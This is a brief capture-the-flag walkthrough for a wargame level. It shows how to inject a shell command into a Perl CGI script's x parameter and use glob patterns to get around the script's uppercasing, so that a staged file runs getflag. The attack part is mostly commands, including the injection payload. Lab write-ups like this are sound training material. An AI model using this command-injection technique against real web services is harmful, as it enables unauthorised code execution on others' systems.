It seems that the perl script takes the arg x and turns it into uppercase and
removes everything after a space.
Merely executing a subshell won't work, let's exploit the shell's globbing capcities

$ echo "getflag > /tmp/FLAG12" > /tmp/PWN12 
$ chmod 777 /tmp/PWN12
$ curl localhost:4646/level12.pl?x='$(/*/PWN12)'
$ cat /tmp/FLAG12
